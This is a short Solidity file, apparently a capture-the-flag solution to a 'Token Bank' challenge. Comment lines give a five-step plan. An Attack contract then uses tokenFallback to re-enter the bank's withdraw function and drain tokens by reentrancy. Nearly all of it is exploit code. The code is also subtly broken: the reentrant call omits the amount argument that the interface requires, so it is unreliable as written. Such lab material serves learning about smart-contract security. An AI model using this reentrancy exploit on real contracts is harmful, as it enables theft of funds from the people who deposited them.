// 1. (Bank) player.withdraw(500000 * 10**18)
// 2. (Token contract) player.approve(Attack, 500000 * 10**18)
// 3. (Token contract) Attack.transferFrom(player, this, 500000 * 10**18)
// 4. (Token contract) Attack.transfer(Bank, 500000 * 10**18)
// 5. (Bank) Attack.withdraw(500000 * 10**18)

pragma solidity ^0.8.0;

interface TokenBankChallenge {
     function withdraw(uint256) external;
}

contract Attack {
    bool flag = true;
    TokenBankChallenge victim;
    constructor(address _addr){
        victim = TokenBankChallenge(_addr);
    }

    function tokenFallback(address from, uint256 value, bytes memory data) public {
        if (flag) {
          flag = false;
          victim.withdraw();
        }
    }

    function attacking() public {
        victim.withdraw(500000 * 10**18);
    }
}
